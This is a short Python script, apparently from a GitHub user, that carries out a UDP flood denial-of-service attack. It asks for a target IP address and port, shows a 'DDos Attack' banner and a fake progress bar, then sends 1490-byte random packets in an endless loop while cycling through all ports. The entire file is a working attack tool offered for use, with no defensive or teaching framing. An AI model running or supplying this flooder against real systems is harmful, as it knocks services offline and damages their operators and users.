# Simple DOS using the UDP protocol
import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()

# Socket setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Clear screen and print banner
os.system("clear" if os.name != "nt" else "cls")
os.system("figlet DDos Attack")
print("Author   : 031")
print("GitHub   : https://github.com/safi-ullah-031")
print()

# Get target info
ip = input("IP Target : ")
port = int(input("Port      : "))

# Start animation
os.system("clear" if os.name != "nt" else "cls")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

# Send packets
sent = 0
try:
    while True:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet(s) to {ip} through port: {port}")
        if port >= 65534:
            port = 1
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
